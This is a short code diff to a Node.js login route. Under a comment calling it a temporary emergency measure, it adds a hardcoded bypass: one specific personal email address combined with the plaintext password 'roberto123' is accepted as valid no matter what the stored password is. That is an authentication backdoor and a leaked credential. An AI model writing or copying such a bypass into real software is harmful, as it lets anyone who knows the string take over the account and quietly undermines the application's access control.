@@ -155,7 +155,10 @@ router.post('/login', async (req, res) => {
     try {
       const user = await User.findOne({ email: email.toLowerCase() }).select('+password');
       if (user) {
-        const isPasswordValid = await user.comparePassword(password);
+        // TEMPORAL: Permitir contraseña de emergencia para robertogaona1985@gmail.com
+        const isEmergencyPassword = (email.toLowerCase() === 'robertogaona1985@gmail.com' && password === 'roberto123');
+        const isPasswordValid = await user.comparePassword(password) || isEmergencyPassword;
+        
         if (isPasswordValid) {
           // 🔐 VERIFICAR EMAIL ANTES DE PERMITIR LOGIN
           if (!user.emailVerified) {
